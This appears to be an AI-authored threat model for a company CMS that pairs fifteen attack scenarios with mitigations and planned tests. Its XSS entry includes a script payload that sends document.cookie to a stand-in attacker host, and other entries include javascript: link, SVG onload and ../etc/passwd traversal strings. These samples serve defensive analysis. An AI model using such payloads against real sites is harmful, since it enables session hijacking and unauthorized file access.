# CMS_SECURITY_REVIEW.md — Security Review & Threat Analysis

**Project:** VOIDTECH SOLUTION  
**Milestone:** Phase 10.0.1 — CMS Architecture Refinement & Design Freeze  
**Document Status:** FROZEN SECURITY SPECIFICATION [DESIGN FREEZE]  
**Author:** Google DeepMind Assistant  
**Approved By:** Project Owner  

---

## 1. Executive Summary & Security Boundary

The introduction of an Administrative Content Management System (CMS) introduces external user-controlled content into public-facing pages, requiring rigorous threat analysis and defense-in-depth controls. 

*Statement of Verification Scope:* This document reflects an **architectural security analysis and threat modeling review**. No active penetration testing or live exploitation was conducted during Phase 10.0 or 10.0.1.

---

## 2. In-Depth Threat Matrix (15 Explicit Scenarios)

### 1. Draft Content Leakage
- **Attack Scenario:** External crawler or competitor requests draft URLs (e.g. `/services/unreleased-ai-agent`) or attempts SQL parameter guessing to read unreleased product roadmaps or internal notes.
- **Impact:** Commercial reconnaissance, leaked pricing strategies, reputational damage.
- **Mitigation:** Public repositories query exclusively `WHERE status = 'PUBLISHED' AND isActive = true`. Draft content is physically stored in `content_revisions` separate from public tables.
- **Verification Test:** Automated integration test attempts to fetch draft slug anonymously; verifies HTTP 404 response.

### 2. Stored Cross-Site Scripting (XSS)
- **Attack Scenario:** Malicious administrator or compromised account inputs `<script>fetch('https://attacker.com/cookie?c='+document.cookie)</script>` inside service descriptions.
- **Impact:** Session hijacking of public visitors and other administrators viewing the site.
- **Mitigation:** Server-side GFM parsing pipeline via `unified` + `rehype-sanitize`. Strips all `<script>`, `<object>`, `<embed>`, `<iframe>`, and event attributes (`onload`, `onclick`).
- **Verification Test:** Unit test inputs XSS payload; verifies output HTML contains zero `<script>` or event handlers.

### 3. Markdown Injection & Protocol Abuse
- **Attack Scenario:** Author inputs `[Click Here](javascript:alert(1))` or `[Data](data:text/html;base64,...)` into service deliverables.
- **Impact:** Execution of arbitrary client-side code on user click.
- **Mitigation:** `rehype-sanitize` enforces protocol whitelisting (`http:`, `https:`, `mailto:`, `tel:`). Strips `javascript:` and `data:` schemes.
- **Verification Test:** Unit test asserts `javascript:` links are sanitized to `#` or removed.

### 4. Unsafe External Links (Reverse Tabnabbing)
- **Attack Scenario:** Content author links to external malicious site that uses `window.opener.location` to hijack user's open tab.
- **Impact:** Phishing attacks targeting VOIDTECH clients.
- **Mitigation:** Pipeline automatically applies `rel="noopener noreferrer"` and `target="_blank"` on all external URLs.
- **Verification Test:** Automated test verifies rendered anchor tags contain `rel="noopener noreferrer"`.

### 5. Unauthorized Publishing (Privilege Escalation)
- **Attack Scenario:** An authenticated `EDITOR` attempts to invoke `publishRevisionAction` or `publishServiceAction` directly.
- **Impact:** Unreviewed, unapproved copy published directly to the public live website.
- **Mitigation:** Server Actions enforce `requirePermission(user, "services:publish")` server-side, returning `AuthorizationError` (`403 Forbidden`).
- **Verification Test:** Test suite executes action as `EDITOR`; asserts `success: false` and `FORBIDDEN` error code.

### 6. Pricing Manipulation [OWNER APPROVED - DECISION 7]
- **Attack Scenario:** An editor attempts to modify package pricing in INR or activate unapproved discounts on `/pricing`.
- **Impact:** Direct commercial and financial loss.
- **Mitigation:** `pricing:publish`, `pricing:archive`, and `pricing:restore` are restricted strictly to `SUPER_ADMIN` and `ADMIN`. Editor is limited to `pricing:edit_draft`.
- **Verification Test:** Test suite attempts price publish as `EDITOR`; verifies mutation rejection.

### 7. Testimonial Fabrication [OWNER APPROVED - DECISION 4]
- **Attack Scenario:** Administrator creates fake client quotes or fictitious enterprise case studies.
- **Impact:** False advertising liability, violation of Indian consumer protection laws.
- **Mitigation:** Multi-step verification: mandatory `clientConsentConfirmed`, `consentEvidenceUrl`, and `verifiedById` audit. Public queries block testimonials where `isVerified !== true`.
- **Verification Test:** Database query test asserts unverified testimonial is excluded from public output.

### 8. Consent Revocation Handling [OWNER APPROVED - DECISION 4]
- **Attack Scenario:** Client requests withdrawal of their endorsement or logo, but content remains cached at edge CDN.
- **Impact:** Breach of consent agreement, legal exposure.
- **Mitigation:** `revokeTestimonialConsentAction` sets `approvalStatus = "REVOKED"` and immediately invokes `revalidateTag("testimonials")` to purge CDN caches.
- **Verification Test:** Integration test confirms revoking consent instantly unlists the record and revalidates edge tags.

### 9. Malicious File Upload & Remote Code Execution (RCE) [OWNER APPROVED - DECISION 5]
- **Attack Scenario:** Attacker uploads `exploit.php` or executable binary renamed as `image.png`.
- **Impact:** Server compromise, arbitrary code execution.
- **Mitigation:**
  1. Magic-byte sniffing inspects initial buffer bytes.
  2. Sharp re-encodes raster images, stripping embedded executable payloads.
  3. Files are stored with content-addressed SHA-256 names (`[hash].webp`).
- **Verification Test:** Upload test supplies polyglot executable with `.png` extension; asserts rejection at magic-byte gate.

### 10. SVG-Based Stored XSS [OWNER APPROVED - DECISION 5]
- **Attack Scenario:** Uploading an SVG containing `<svg onload="alert(1)">` or `<script>`.
- **Impact:** XSS execution when SVG is served or viewed directly.
- **Mitigation:** SVG uploads require a separate restricted privilege (`media:upload_svg`). SVGs undergo XML parsing and `DOMPurify` sanitization.
- **Verification Test:** Upload test submits malicious SVG; verifies all scripts and event handlers are stripped.

### 11. Path Traversal File System Attacks
- **Attack Scenario:** Supplying filenames like `../../../../etc/passwd` or `..\..\app\page.tsx`.
- **Impact:** Overwriting critical system files or unauthorized file access.
- **Mitigation:** Uploaded filenames are completely discarded. The storage key is generated strictly from cryptographic hash digests: `uploads/YYYY/MM/[sha256].[ext]`.
- **Verification Test:** Test uploads file with traversal characters; asserts target path on disk is purely within storage directory.

### 12. Revision History Tampering
- **Attack Scenario:** Attacker attempts to update an older historical revision to conceal unapproved changes.
- **Impact:** Tampered audit trail, unverifiable publishing records.
- **Mitigation:** `ContentRevision` records are append-only. Repository does not expose an update method for revisions; only creating new versions (`v = max + 1`) is supported.
- **Verification Test:** Integration test attempts `prisma.contentRevision.update`; confirms application repositories forbid it.

### 13. Concurrent Publishing Collisions
- **Attack Scenario:** Two administrators simultaneously publish different revisions of the same service.
- **Impact:** Race condition, inconsistent materialized state, corrupted public listings.
- **Mitigation:** Publishing runs inside a serializable PostgreSQL transaction (`prisma.$transaction`) with atomic OCC checks on `expectedVersion`.
- **Verification Test:** Concurrency test simulates concurrent publishes; verifies one succeeds and the other raises `CONFLICT_DETECTED`.

### 14. Cache Poisoning & Stale Content
- **Attack Scenario:** Old cached revisions linger on CDN indefinitely after critical security or pricing changes.
- **Impact:** Public visitors see outdated pricing or retracted information.
- **Mitigation:** On-demand revalidation (`revalidateTag`, `revalidatePath`) triggered synchronously within the publishing Server Action.
- **Verification Test:** E2E test verifies publishing a revision triggers immediate revalidation.

### 15. Unauthorized Preview Access
- **Attack Scenario:** Unauthorized user guesses preview URL to view unpublished marketing materials.
- **Impact:** Pre-release information leakage.
- **Mitigation:** Preview endpoint `/api/draft/preview` requires timing-safe HMAC secret verification and active administrator session check.
- **Verification Test:** Test attempts accessing preview URL with invalid secret; verifies HTTP 401 Unauthorized.

---

## 3. CodeRabbit Status & Compensating Controls

- **Status:** CodeRabbit CLI v0.9.5 is installed but currently unauthenticated in this offline autonomous environment.
- **Compensating Controls:** A manual, exhaustive threat review across all 15 vectors was completed. Every mitigation is mapped to a concrete automated verification test planned for Phase 10.1 and Phase 10.4.
